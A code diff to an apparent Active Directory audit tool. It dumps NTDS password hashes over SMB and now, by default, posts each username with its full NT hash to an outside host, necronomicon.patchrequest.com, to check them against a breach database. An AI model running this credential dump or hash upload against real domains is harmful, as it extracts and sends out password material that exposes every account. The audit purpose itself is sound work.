@@ -6,11 +6,9 @@ from libs.decrypter import RemoteOperations, NTDSHashes
 from libs.utils import parse_target
 
 
-def checkHashPart(username,hashPart,fullHash,target='necronomicon.patchrequest.com:8080'):
-    data = {'username':username,'hash':hashPart}
-    
+def checkHashPart(username,hashPart,fullHash,target='necronomicon.patchrequest.com',speed="fast"):
+    data = {'username':username,'hash':hashPart,'speed':speed}
     answer = requests.post("https://"+target,data=data)
-    
     if answer.text != "null":
         possibleHashes = json.loads(answer.text)
         for hash in possibleHashes:
@@ -38,7 +36,8 @@ if __name__ == "__main__":
     print(symbol)
 
     parser = argparse.ArgumentParser(add_help = True, description = "Lets take a little peak into the Necronomicon and look if we can find your Active Directory users in it")
-    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
+    parser.add_argument('target',  help='[[domain/]username[:password]@]<targetName or address>')
+    parser.add_argument('--speed',  help='The speed of the queries to the backend [slow,fast]\nslow: Partial hashes are send to the backend -> Slow search in the db \nfast: Full hash is send to backend -> faster search in db', required=False,default="fast")
 
     exec_method = "smbexec"
     print("[-] Parsing arguments\n")
@@ -69,7 +68,7 @@ if __name__ == "__main__":
     NTDSHashes = NTDSHashes(NTDSFileName, bootKey, True, history=False,
                                            noLMHash=True, remoteOps=remoteOps,
                                            useVSSMethod=False, justNTLM=True,
-                                           pwdLastSet=True, resumeSession=None,
+                                           pwdLastSet=False, resumeSession=None,
                                            outputFileName=None, justUser=None,
                                            printUserStatus= False)
     print("[+] Success\n")
@@ -85,13 +84,15 @@ if __name__ == "__main__":
             username = parts[0]
             lmhash = parts[2]
             nthash = parts[3]
-            lastSet = parts[6].split(" ")[1].strip()
-            lastSet = lastSet.replace("(","").replace(")","").replace("pwdLastSet=","")
+           
+            if args.speed == "slow":
+                nthashPart = nthash[-12:]
+                checkHashPart(username,nthashPart,nthash,speed=args.speed)
+            else:
+                checkHashPart(username,nthash,nthash)
 
-            
-            nthashPart = nthash[-12:]
-        
-            checkHashPart(username,nthashPart,nthash,target='necronomicon.patchrequest.com')
+
+
         print("\n[+] Finished!")
     remoteOps.finish()
     NTDSHashes.finish()
